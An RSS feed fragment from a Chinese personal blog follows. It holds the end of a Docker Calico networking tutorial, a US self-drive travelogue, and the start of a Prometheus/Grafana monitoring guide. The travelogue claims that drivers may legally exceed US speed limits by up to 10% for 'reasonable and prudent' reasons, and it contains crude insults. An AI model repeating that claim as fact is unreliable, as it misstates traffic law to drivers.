docker run &lt;span class=&quot;nt&quot;&gt;--net&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;host &lt;span class=&quot;nt&quot;&gt;--privileged&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;calico-node &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--restart&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;always &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;NODENAME&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;node1 &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;CALICO_NETWORKING_BACKEND&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;bird &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;CALICO_LIBNETWORK_ENABLED&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;ETCD_ENDPOINTS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;http://192.168.33.10:2379 &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; /var/log/calico:/var/log/calico &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; /var/run/calico:/var/run/calico &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; /lib/modules:/lib/modules &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; /run:/run &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; /run/docker/plugins:/run/docker/plugins &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; /var/run/docker.sock:/var/run/docker.sock quay.io/calico/node:v2.6.12

Image may take a short &lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;to download &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;it is not available locally.
Container started, checking progress logs.

2019-06-06 07:16:41.433 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO][8] startup.go 173: Early log level &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;to info
2019-06-06 07:16:41.433 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO][8] client.go 202: Loading config from environment
2019-06-06 07:16:41.434 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO][8] startup.go 83: Skipping datastore connection &lt;span class=&quot;nb&quot;&gt;test
&lt;/span&gt;2019-06-06 07:16:41.439 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO][8] startup.go 259: Building new node resource &lt;span class=&quot;nv&quot;&gt;Name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;node1&quot;&lt;/span&gt;
2019-06-06 07:16:41.439 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO][8] startup.go 273: Initialise BGP data
2019-06-06 07:16:41.441 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO][8] startup.go 467: Using autodetected IPv4 address on interface eth1: 192.168.33.11/24
2019-06-06 07:16:41.441 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO][8] startup.go 338: Node IPv4 changed, will check &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;conflicts
2019-06-06 07:16:41.444 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO][8] etcd.go 430: Error enumerating host directories &lt;span class=&quot;nv&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;100: Key not found &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;/calico&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;11]
2019-06-06 07:16:41.444 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO][8] startup.go 530: No AS number configured on node resource, using global value
2019-06-06 07:16:41.448 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO][8] etcd.go 105: Ready flag is now &lt;span class=&quot;nb&quot;&gt;set
&lt;/span&gt;2019-06-06 07:16:41.452 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO][8] client.go 133: Assigned cluster GUID &lt;span class=&quot;nv&quot;&gt;ClusterGUID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;05d43659a30f4f08a15f9515fcd0278f&quot;&lt;/span&gt;
2019-06-06 07:16:41.471 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO][8] startup.go 419: CALICO_IPV4POOL_NAT_OUTGOING is &lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;defaulted&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; through environment variable
2019-06-06 07:16:41.471 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO][8] startup.go 659: Ensure default IPv4 pool is created. IPIP mode: off
2019-06-06 07:16:41.473 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO][8] startup.go 670: Created default IPv4 pool &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;192.168.0.0/16&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; with NAT outgoing true. IPIP mode: off
2019-06-06 07:16:41.473 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO][8] startup.go 419: FELIX_IPV6SUPPORT is &lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;defaulted&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; through environment variable
2019-06-06 07:16:41.473 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO][8] startup.go 626: IPv6 supported on this platform: &lt;span class=&quot;nb&quot;&gt;true
&lt;/span&gt;2019-06-06 07:16:41.473 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO][8] startup.go 419: CALICO_IPV6POOL_NAT_OUTGOING is &lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;defaulted&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; through environment variable
2019-06-06 07:16:41.473 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO][8] startup.go 659: Ensure default IPv6 pool is created. IPIP mode: off
2019-06-06 07:16:41.475 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO][8] startup.go 670: Created default IPv6 pool &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;fd80:24e2:f998:72d6::/64&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; with NAT outgoing false. IPIP mode: off
2019-06-06 07:16:41.514 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO][8] startup.go 131: Using node name: node1
2019-06-06 07:16:41.814 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO][12] client.go 202: Loading config from environment
Starting libnetwork service
Calico node started successfully
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;设置主机网络，例如 enable IP forwarding。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;下载并启动 calico-node 容器，calico 会以容器的形式运行（与 weave 类似）。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;连接 etcd。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;calico 启动成功。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;查看calico运行状态:&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root@node1 ~]# calicoctl node status
Calico process is running.

IPv4 BGP status
+---------------+-------------------+-------+----------+--------+
| PEER ADDRESS  |     PEER TYPE     | STATE |  SINCE   |  INFO  |
+---------------+-------------------+-------+----------+--------+
| 192.168.33.12 | node-to-node mesh | start | 07:17:09 | Active |
+---------------+-------------------+-------+----------+--------+

IPv6 BGP status
No IPv6 peers found.

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root@node1 ~]# calicoctl node status
Calico process is running.

IPv4 BGP status
+---------------+-------------------+-------+----------+-------------+
| PEER ADDRESS  |     PEER TYPE     | STATE |  SINCE   |    INFO     |
+---------------+-------------------+-------+----------+-------------+
| 192.168.33.12 | node-to-node mesh | up    | 07:17:13 | Established |
+---------------+-------------------+-------+----------+-------------+

IPv6 BGP status
No IPv6 peers found.

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;创建calico网络：&lt;/p&gt;

&lt;p&gt;在 node1 或 node2 上执行如下命令创建 calico 网络 cal_ent1：&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;docker network create --driver calico --ipam-driver calico-ipam cal_net1&lt;/code&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;–driver calico 指定使用 calico 的 libnetwork CNM driver。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;–ipam-driver calico-ipam 指定使用 calico 的 IPAM driver 管理 IP。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;calico 为 global 网络，etcd 会将 cal_net 同步到所有主机。&lt;/p&gt;

&lt;h2 id=&quot;calico网络结构&quot;&gt;Calico网络结构&lt;/h2&gt;

&lt;p&gt;在 node1 中运行容器 bbox1 并连接到 cal_net1：&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;docker container run --net cal_net1 --name bbox1 -tid busybox&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;查看 bbox1 的网络配置:&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root@node1 ~]# docker &lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;bbox1 ip a
1: lo: &amp;lt;LOOPBACK,UP,LOWER_UP&amp;gt; mtu 65536 qdisc noqueue qlen 1
    &lt;span class=&quot;nb&quot;&gt;link&lt;/span&gt;/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
5: cali0@if6: &amp;lt;BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN&amp;gt; mtu 1500 qdisc noqueue 
    &lt;span class=&quot;nb&quot;&gt;link&lt;/span&gt;/ether ee:ee:ee:ee:ee:ee brd ff:ff:ff:ff:ff:ff
    inet 192.168.166.128/32 brd 192.168.166.128 scope global cali0
       valid_lft forever preferred_lft forever
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;cali0 是 calico interface，分配的 IP 为 192.168.166.128。cali0 对应 node1 编号 6 的 interface calicce21fc3677@if5&lt;/p&gt;

&lt;p&gt;node1 将作为 router 负责转发目的地址为 bbox1 的数据包&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root@node1 ~]# ip r
default via 10.0.2.2 dev eth0 proto static metric 100 
10.0.2.0/24 dev eth0 proto kernel scope &lt;span class=&quot;nb&quot;&gt;link &lt;/span&gt;src 10.0.2.15 metric 100 
172.17.0.0/16 dev docker0 proto kernel scope &lt;span class=&quot;nb&quot;&gt;link &lt;/span&gt;src 172.17.0.1 
192.168.33.0/24 dev eth1 proto kernel scope &lt;span class=&quot;nb&quot;&gt;link &lt;/span&gt;src 192.168.33.11 metric 100 
192.168.104.0/26 via 192.168.33.12 dev eth1 proto bird 
192.168.166.128 dev calicce21fc3677 scope &lt;span class=&quot;nb&quot;&gt;link 
&lt;/span&gt;blackhole 192.168.166.128/26 proto bird 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;所有发送到 bbox1 的数据都会发给calicce21fc3677，因为calicce21fc3677 与 cali0 是一对 veth pair，bbox1 能够接收到数据。&lt;/p&gt;

&lt;p&gt;接下来我们在 host2 中运行容器 bbox2，也连接到 cal_net1：&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root@node2 ~]# docker &lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;bbox2 ip a
1: lo: &amp;lt;LOOPBACK,UP,LOWER_UP&amp;gt; mtu 65536 qdisc noqueue qlen 1
    &lt;span class=&quot;nb&quot;&gt;link&lt;/span&gt;/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
5: cali0@if6: &amp;lt;BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN&amp;gt; mtu 1500 qdisc noqueue 
    &lt;span class=&quot;nb&quot;&gt;link&lt;/span&gt;/ether ee:ee:ee:ee:ee:ee brd ff:ff:ff:ff:ff:ff
    inet 192.168.104.0/32 brd 192.168.104.0 scope global cali0
       valid_lft forever preferred_lft forever
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;IP 为192.168.104.0&lt;/p&gt;

&lt;p&gt;node2 添加了两条路由：&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root@node2 ~]# ip r
default via 10.0.2.2 dev eth0 proto static metric 100 
10.0.2.0/24 dev eth0 proto kernel scope &lt;span class=&quot;nb&quot;&gt;link &lt;/span&gt;src 10.0.2.15 metric 100 
172.17.0.0/16 dev docker0 proto kernel scope &lt;span class=&quot;nb&quot;&gt;link &lt;/span&gt;src 172.17.0.1 
192.168.33.0/24 dev eth1 proto kernel scope &lt;span class=&quot;nb&quot;&gt;link &lt;/span&gt;src 192.168.33.12 metric 100 
192.168.104.0 dev calib5228fd5fcd scope &lt;span class=&quot;nb&quot;&gt;link 
&lt;/span&gt;blackhole 192.168.104.0/26 proto bird 
192.168.166.128/26 via 192.168.33.11 dev eth1 proto bird 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ol&gt;
  &lt;li&gt;目的地址为 node1 容器 subnet 192.168.166.128/26 的路由。&lt;/li&gt;
  &lt;li&gt;目的地址为本地 bbox2 容器 192.168.104.0 的路由。&lt;/li&gt;
  &lt;li&gt;注意到node1的路由表，同样的，node1 也自动添加了到 192.168.104.0/26 的路由。&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;calico-的默认连通性&quot;&gt;Calico 的默认连通性&lt;/h2&gt;

&lt;p&gt;测试一下 bbox1 与 bbox2 的连通性：&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root@node1 ~]# docker &lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;bbox1 ping bbox2
PING bbox2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;192.168.104.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: 56 data bytes
64 bytes from 192.168.104.0: &lt;span class=&quot;nb&quot;&gt;seq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0 &lt;span class=&quot;nv&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;62 &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.996 ms
64 bytes from 192.168.104.0: &lt;span class=&quot;nb&quot;&gt;seq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 &lt;span class=&quot;nv&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;62 &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.568 ms
64 bytes from 192.168.104.0: &lt;span class=&quot;nb&quot;&gt;seq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2 &lt;span class=&quot;nv&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;62 &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.498 ms
64 bytes from 192.168.104.0: &lt;span class=&quot;nb&quot;&gt;seq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;3 &lt;span class=&quot;nv&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;62 &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.539 ms
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;calico 默认的 policy 规则是：容器只能与同一个 calico 网络中的容器通信。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;既然这是默认 policy，那就有方法定制 policy，这也是 calico 较其他网络方案最大的特性。&lt;/p&gt;
&lt;/blockquote&gt;
</description>
        <pubDate>Thu, 06 Jun 2019 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/2019-06-06/Docker%E9%83%A8%E7%BD%B2Calico%E7%BD%91%E7%BB%9C/</link>
        <guid isPermaLink="true">http://localhost:4000/2019-06-06/Docker%E9%83%A8%E7%BD%B2Calico%E7%BD%91%E7%BB%9C/</guid>
        
        <category>容器</category>
        
        
        <category>网络</category>
        
      </item>
    
      <item>
        <title>美帝游记——2.开车</title>
        <description>&lt;p&gt;　　第一次在国外开车，还是要做足准备的。美国跟中国一样都是左舵，靠右行驶，车的构造也是类似的，总体上很容易上手。租车的时候会检查驾驶证，需要至少一年的经验。&lt;/p&gt;

&lt;p&gt;　　本次美国行程，包括2个大城市（旧金山、洛杉矶）和1号公路，国家公园（优胜美地），山道跟乡村，还有城市道路。&lt;/p&gt;

&lt;p&gt;　　我是第一次出国自驾，但是美国道路让我头一天就能够非常适应，手机导航也可以很好地工作。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/4729226/56277050-2d70b480-6136-11e9-95f4-4ddab4c2dc64.jpg&quot; alt=&quot;旧金山&quot; /&gt;&lt;/p&gt;

&lt;p&gt;　　美国即使是大城市，也有大量低矮的房子，所以整个城市是按摊大饼的方式设计的，这导致的结果是在路上，车比人多，而且每家人均一辆车，整个城市的运转非常依赖私人汽车，所以美国也是最适合自驾游的国家之一。&lt;/p&gt;

&lt;p&gt;　　在旧金山，半小时能开40+公里，在重庆，半小时只能开10公里。但是由于中国城市功能集中在市中心，美国会比较分散。&lt;/p&gt;

&lt;h2 id=&quot;租车&quot;&gt;租车&lt;/h2&gt;

&lt;p&gt;　　我们租了一辆日产楼兰，两个人用绰绰有余。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/4729226/56276006-598b3600-6134-11e9-9144-ca2983c99ffd.jpg&quot; alt=&quot;美版楼兰&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;gps&quot;&gt;GPS&lt;/h2&gt;

&lt;p&gt;　　在美国自驾，GPS是必须品。&lt;/p&gt;

&lt;p&gt;　　在国内开车时，我基本上都用百度地图。不过在美国，3G/4G网络信号并没有覆盖到所有地方。特别是荒无人烟的西部，进入国家公园就没有任何信号。所以无论是安全还是方便，&lt;del&gt;都应该准备一个预装了当地地图的GPS&lt;/del&gt; 实测离线地图APP足矣&lt;/p&gt;

&lt;h2 id=&quot;限速&quot;&gt;限速&lt;/h2&gt;

&lt;p&gt;　　美国限速设置更高，距离单位是英里（美国时速是以MILE/小时计算，1MILE＝1.6公里。在路标上也会见到MPH的标识，就是Mile per Hour的意思）。&lt;/p&gt;

&lt;p&gt;　　换算过来之后，一般的两车道郊区公路和市区高速路限速65 MPH，而实际开的时候如果有“合理并且谨慎的理由”（”reasonable and prudent”），可以超速一点点（不超过10%）。什么是合理并且谨慎的理由，比如环境、路况、跟随车流等。&lt;/p&gt;

&lt;p&gt;　　对比而言，中国的三车道大马路也经常限速60公里，让人特别无语，路过时几乎没有人能不超速，而且超速也没什么后果。从这点上来说，中国是立法严格，但是执法宽松。美国是立法宽松，但是执法严格。&lt;/p&gt;

&lt;p&gt;　　有一些路的最左侧设置了carpool lane（地上画了菱形），这条路是给车内有2人（包括司机）以上的车辆行驶用的。这个是为了鼓励多人同行，而不是一人开一辆车，不过观察来看，大多数车都是司机一个人（80%），所以就只能在普通速度的车道上开了（普通车道也非常快，能达到限速上限），所以我们也没有去尝试carpool lane。&lt;/p&gt;

&lt;h2 id=&quot;stop-sign&quot;&gt;STOP SIGN&lt;/h2&gt;

&lt;p&gt;　　这个是最重要的，STOP这个标识，看到了一定要完全停下来，左右观察完全没问题再通过。&lt;/p&gt;

&lt;p&gt;　　在某些十字路口，STOP SIGN代替了红绿灯，这样道路运行能更加顺畅。国内也有STOP SIGN，不过据我观察几乎都是无视..&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/4729226/56277142-5abd6280-6136-11e9-9512-28c037fc773d.jpg&quot; alt=&quot;stop sign&quot; /&gt;&lt;/p&gt;

&lt;p&gt;　　在一些小路进入大道的时候，会有单向的STOP标识，在主道上没有。所以这种情况下大道上的车是完全不会减速的，在美国这是社会共识，所以小路让主路、左转让直行是大家都遵守的。在旧金山有一次我左转看见绿灯就转了，但是对面直行还是绿灯，相当惊险，所幸没有出现事故。&lt;/p&gt;

&lt;p&gt;　　刚去美国开车的中国人可能会不习惯，我的车身都挤出半个头了，为什么他不让我呢？这种情况下真的有可能酿成车祸！因为对方思维方式不是这样的，他看见你准备并道反而会加速，是为了更快通过不至于影响你。&lt;/p&gt;

&lt;h2 id=&quot;道路&quot;&gt;道路&lt;/h2&gt;

&lt;p&gt;　　在斯坦福大学开车，并没有一个大门，开着开着，路的两侧开始出现整齐的棕榈树，这时候已经进入斯坦福大学的园区。&lt;/p&gt;

&lt;p&gt;　　在一号公路开车，路的右侧都是无敌海景。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/4729226/56277975-f13e5380-6137-11e9-9061-899d6a1ee95e.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;停车&quot;&gt;停车&lt;/h2&gt;

&lt;p&gt;　　大城市里停车比较困难，停车场很贵。马路边的车位一般是用咪表，而且要注意可以停车的时段和时长，超了可是会有警察来贴条的。&lt;/p&gt;

&lt;h2 id=&quot;跟中国开车的对比&quot;&gt;跟中国开车的对比&lt;/h2&gt;

&lt;p&gt;　　刚回国的时候，我还有点不适应国内的开车情况，经常有“你TM在逗我？”的感觉。其实我觉得，就TM是因为总有傻逼乱抢道、逆行、开远光灯、按喇叭、左转不让直行、不看道路突然起步、突然进入主道等。&lt;/p&gt;

&lt;p&gt;　　我平时也算比较温和，但是在国内开车也时常会忍无可忍地按喇叭，把在美国养成的习惯全部抛弃。我现在更是从一个“车怒症”患者，变成了一个“路怒症”患者。&lt;/p&gt;

&lt;p&gt;　　在开车的时候，我一直努力做一个，不给别人添麻烦的人。&lt;/p&gt;

&lt;p&gt;　　我尽自己的全力，努力遵守所有的交通规则，给其他的人以便利。&lt;/p&gt;

&lt;p&gt;　　当然，我这样做最重要的目的，是为了保护自己和家人的安全。我希望这些安全，尽可能在我的控制范围之内。&lt;/p&gt;

&lt;p&gt;　　但，我依然是一个路怒症！！！！！&lt;/p&gt;

&lt;p&gt;　　为什么？&lt;/p&gt;

&lt;p&gt;　　因为那些人从来不顾别人的感受，野蛮、粗暴、横冲直撞，无时不刻的置自己与别人于危险之中浑然不觉甚至洋洋自得。我们没有文化的人就是这样的？.jpg&lt;/p&gt;
</description>
        <pubDate>Wed, 17 Apr 2019 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/2019-04-17/%E7%BE%8E%E5%B8%9D%E6%B8%B8%E8%AE%B0-2.%E5%BC%80%E8%BD%A6/</link>
        <guid isPermaLink="true">http://localhost:4000/2019-04-17/%E7%BE%8E%E5%B8%9D%E6%B8%B8%E8%AE%B0-2.%E5%BC%80%E8%BD%A6/</guid>
        
        <category>游记</category>
        
        
        <category>随行</category>
        
      </item>
    
      <item>
        <title>使用 prometheus 和 grafana 监控 linux 机器</title>
        <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#运行prometheus&quot; id=&quot;markdown-toc-运行prometheus&quot;&gt;运行prometheus&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#使用-node-exporter-收集监控数据&quot; id=&quot;markdown-toc-使用-node-exporter-收集监控数据&quot;&gt;使用 node exporter 收集监控数据&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#安装配置-grafana&quot; id=&quot;markdown-toc-安装配置-grafana&quot;&gt;安装配置 grafana&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#配置告警&quot; id=&quot;markdown-toc-配置告警&quot;&gt;配置告警&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#总结&quot; id=&quot;markdown-toc-总结&quot;&gt;总结&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;　　Prometheus 是一个非常优秀的监控工具。准确的说，应该是监控方案。Prometheus 提供了监控数据搜集、存储、处理、可视化和告警一套完整的解决方案。让我们先来看看 Prometheus 的架构。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/4729226/56795946-2a677980-6844-11e9-9cfd-5bc9be82b2e0.jpg&quot; alt=&quot;prometheus1&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;prometheus server 位于中心，负责时序数据的收集、存储和查询&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;左边是数据来源，prometheus 统一采用拉取的模式（pull mode）从兼容的 HTTP 接口处获取数据，数据源可以分为三种&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;　　1. 本身就暴露 prometheus 可读取 metrics 数据的或者专门为某个组件编写的 exporter，称为 Jobs 或者 Exporters，比如 node exporter&lt;/p&gt;

&lt;p&gt;　　2. 通过 push gateway 可以把原来 push 类型的数据转换成 pull 类型&lt;/p&gt;

&lt;p&gt;　　3. 其他 prometheus server&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;上面是目标自动发现机制。对于生产的很多情况，手动配置所有的 metrics 来源可能会非常繁琐，所以 prometheus 支持 DNS、k8s、Consul 等服务发现机制来动态地获取目标源进行数据抓取&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;右下方是数据输出，一般是用来进行 UI 展示，可以使用 grafana 等开源方案，也可以直接读取 prometheus 的接口进行自主开发&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;右上方是告警部分，用户需要配置告警规则，一旦 alertManager 发现监控数据匹配告警规则，就把告警信息通过邮件、社交账号发送出去&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;p&gt;　　整个系统使用了三个组件：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;node-exporter：运行在主机上收集操作系统上各种数据的 agent，prometheus 中称为 exporter&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;prometheus server：开源的时序数据库，作为数据存储和分析的中心&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;grafana：数据展示分析界面，提供各种强大的 dashboard，可以从多个数据源读取数据，其中就包括 prometheus&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;NOTE：所有的服务都是通过 docker 启动，需要安装 docker 和 docker-compose&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;运行prometheus&quot;&gt;运行prometheus&lt;/h2&gt;

